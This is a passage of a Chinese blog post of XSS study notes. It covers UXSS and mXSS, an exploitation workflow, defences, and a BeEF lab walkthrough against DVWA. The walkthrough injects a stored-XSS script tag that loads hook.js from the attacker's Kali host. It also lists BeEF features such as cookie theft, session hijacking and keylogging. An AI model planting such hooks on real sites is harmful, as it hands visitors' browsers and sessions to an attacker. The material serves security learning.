+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png" title="image-20230511011114675" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png 2x"
+            sizes="auto"
+            alt="image-20230511011114675">
+    </a></figure></p>
+<p>会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。</p>
+<h4 id="4通用型xss" class="headerLink">
+    <a href="#4%e9%80%9a%e7%94%a8%e5%9e%8bxss" class="header-mark"></a>(4)通用型XSS</h4><p>通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。</p>
+<p>上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</p>
+<h5 id="漏洞成因-3" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0-3" class="header-mark"></a>漏洞成因</h5><p>Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。</p>
+<p>不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。</p>
+<h5 id="漏洞案例" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e6%a1%88%e4%be%8b" class="header-mark"></a>漏洞案例</h5><p>IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞</p>
+<p>这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。</p>
+<h4 id="5突变型xss" class="headerLink">
+    <a href="#5%e7%aa%81%e5%8f%98%e5%9e%8bxss" class="header-mark"></a>(5)突变型XSS</h4><p>突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation）</p>
+<h5 id="漏洞成因-4" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0-4" class="header-mark"></a>漏洞成因</h5><p>然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。</p>
+<p>随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。</p>
+<h5 id="攻击流程-2" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b-2" class="header-mark"></a>攻击流程</h5><p>将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。</p>
+<h2 id="0x4-利用流程" class="headerLink">
+    <a href="#0x4-%e5%88%a9%e7%94%a8%e6%b5%81%e7%a8%8b" class="header-mark"></a>0x4 利用流程</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">找注入点</span>
+</span></span><span class="line"><span class="cl">	<span class="err">找到数据输入的地方</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="err">判断回显位置</span><span class="o">---</span><span class="err">输入的数据在什么地方输出</span>
+</span></span><span class="line"><span class="cl">	<span class="err">如果输入的数据能够在前端进行输出，则可以证明输入的前段恶意代码在没有安全性处理的情</span> <span class="err">况下能够输出前端，从而造成风险</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span><span class="err">构造基础的</span><span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span><span class="err">进行提交</span><span class="n">payload</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">5.</span><span class="err">分析响应状况</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">1.</span> <span class="err">如果成功解析则</span><span class="n">XSS存在</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">2.</span> <span class="err">反之考虑绕过</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">6.</span><span class="err">确认漏洞</span>
+</span></span><span class="line"><span class="cl">	<span class="err">如果响应达到了预期，则说明漏洞存在，反之不存在。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x5-难度" class="headerLink">
+    <a href="#0x5-%e9%9a%be%e5%ba%a6" class="header-mark"></a>0x5 难度</h2><p>高危漏洞但漏洞库不一定接受此漏洞，存储型XSS肯定被接受</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">反射型攻击难度较高</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">1.</span><span class="err">如何发送含有</span><span class="n">payload的连接呢</span><span class="o">---</span><span class="err">社工</span><span class="o">------</span><span class="err">效率很低</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">2.</span> <span class="err">影响面较小</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="err">存储型</span><span class="n">XSS攻击难度较小</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">1.</span><span class="err">攻击者将恶意代码写入数据库，只要访问该网站的用户必定中招。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x6-防御" class="headerLink">
+    <a href="#0x6-%e9%98%b2%e5%be%a1" class="header-mark"></a>0x6 防御</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.过滤---将关键的字符过滤掉
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 实体化编码
+</span></span><span class="line"><span class="cl">   1.将特殊字符转换成字符串
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x7自动化xss" class="headerLink">
+    <a href="#0x7%e8%87%aa%e5%8a%a8%e5%8c%96xss" class="header-mark"></a>0x7自动化XSS</h2><h3 id="beef简介" class="headerLink">
+    <a href="#beef%e7%ae%80%e4%bb%8b" class="header-mark"></a>BeEF简介</h3><p>Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://beefproject.com/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="信息收集" class="headerLink">
+    <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a><strong>信息收集</strong>：</h4><ol>
+<li>网络发现</li>
+<li>主机信息</li>
+<li>Cookie获取 4. 会话劫持</li>
+<li>键盘记录</li>
+<li>插件信息</li>
+</ol>
+<h4 id="持久化控制" class="headerLink">
+    <a href="#%e6%8c%81%e4%b9%85%e5%8c%96%e6%8e%a7%e5%88%b6" class="header-mark"></a><strong>持久化控制</strong>:</h4><ol>
+<li>确认弹框</li>
+<li>小窗口</li>
+<li>中间人</li>
+</ol>
+<h4 id="社会工程" class="headerLink">
+    <a href="#%e7%a4%be%e4%bc%9a%e5%b7%a5%e7%a8%8b" class="header-mark"></a><strong>社会工程</strong>：</h4><ol>
+<li>点击劫持</li>
+<li>弹窗告警</li>
+<li>虚假页面</li>
+<li>钓鱼页面</li>
+</ol>
+<h4 id="渗透攻击" class="headerLink">
+    <a href="#%e6%b8%97%e9%80%8f%e6%94%bb%e5%87%bb" class="header-mark"></a><strong>渗透攻击</strong>：</h4><ol>
+<li>内网渗透</li>
+<li>Metasploit</li>
+<li>CSRF攻击</li>
+<li>DDOS攻击</li>
+</ol>
+<h3 id="beef基础" class="headerLink">
+    <a href="#beef%e5%9f%ba%e7%a1%80" class="header-mark"></a>BeEF基础</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">启动Apache和BeEF:
+</span></span><span class="line"><span class="cl">root@kali:~# service apache2 start
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png" title="image-20230511012003975" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png 2x"
+            sizes="auto"
+            alt="image-20230511012003975">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png" title="image-20230511012040339" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png 2x"
+            sizes="auto"
+            alt="image-20230511012040339">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png" title="image-20230511012057736" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png 2x"
+            sizes="auto"
+            alt="image-20230511012057736">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script src=&#34;http://192.168.106.140:3000/hook.js&#34;&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">注：192.168.106.140为BeEF所在机器，即Kali Linux IP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">登录BeEF: 
+</span></span><span class="line"><span class="cl">username: beef 
+</span></span><span class="line"><span class="cl">password: beef
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png" title="image-20230511012200754" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png 2x"
+            sizes="auto"
+            alt="image-20230511012200754">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png" title="image-20230511012222723" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png 2x"
+            sizes="auto"
+            alt="image-20230511012222723">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png" title="image-20230511012242056" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png 2x"
+            sizes="auto"
+            alt="image-20230511012242056">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">渗透机将脚本放在DWVA靶机中：
+</span></span><span class="line"><span class="cl">&lt;script src=&#34;http://192.168.106.140:3000/hook.js&#34;&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">注：192.168.106.140为BeEF所在机器，即Kali Linux IP
+</span></span><span class="line"><span class="cl">注：需修改字符数的限制，例如为200
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png" title="image-20230511012309967" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png 2x"
+            sizes="auto"
+            alt="image-20230511012309967">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">肉机Win7 访问XSS stored页面
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png" title="image-20230511012338936" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png 2x"
+            sizes="auto"
+            alt="image-20230511012338936">
+    </a></figure></p>
+<p>BeEF页面查看肉鸡是否上线</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png" title="image-20230511012354899" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png 2x"
+            sizes="auto"
+            alt="image-20230511012354899">
+    </a></figure></p>
+<h3 id="信息收集-1" class="headerLink">
+    <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-1" class="header-mark"></a>信息收集</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png" title="image-20230511012426644" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png 2x"
+            sizes="auto"
+            alt="image-20230511012426644">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">命令颜色(Color):
+</span></span><span class="line"><span class="cl">绿色  对目标主机生效并且不可见（不会被发现） 
+</span></span><span class="line"><span class="cl">橙色  对目标主机生效但可能可见（可能被发现） 
+</span></span><span class="line"><span class="cl">灰色  对目标主机未必生效（可验证下）
+</span></span><span class="line"><span class="cl">红色  对目标主机不生效
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png" title="image-20230511012459413" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png 2x"
+            sizes="auto"
+            alt="image-20230511012459413">
+    </a></figure></p>
+<p>这篇博客是从CSDN上扒下来的，借着护网面试的缘由，复习了一下</p>
+<p>本文链接：https://blog.csdn.net/weixin_53002381/article/details/126017006</p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-17&nbsp;<a class="git-hash" href="https://github.com/HEIGE-PCloud/DoIt/commit/969375dd70cd7acbf2e549364429ffcb642588c5" target="_blank" title="commit by scofield(scofield_1920@outlook.com) 969375dd70cd7acbf2e549364429ffcb642588c5: data" rel="noopener noreferrer">
+                                    <i class="fas fa-hashtag fa-fw"></i>969375d</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/xss/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\XSS.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\XSS.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20XSS&body=|Field|Value|%0A|-|-|%0A|Title|XSS|%0A|Url|http://scofield1920.github.io/xss/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\XSS.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/xss/" data-title="XSS" data-hashtags="notes"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/xss/" data-hashtag="notes"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/xss/" data-title="XSS"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/xss/" data-title="XSS"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/xss/" data-title="XSS"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/xss/" data-title="XSS" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;XSS&#34;, &#34;http://scofield1920.github.io/xss/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/notes/">notes</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/xss-csrf_combination/" class="prev" rel="prev" title="XSS&#43;CSRF组合打法"><i class="fas fa-angle-left fa-fw"></i>XSS&#43;CSRF组合打法</a>
+            <a href="/wireshark_capture_qq_ip/" class="next" rel="next" title="WireShark监听QQ通信数据获取对方IP">WireShark监听QQ通信数据获取对方IP<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
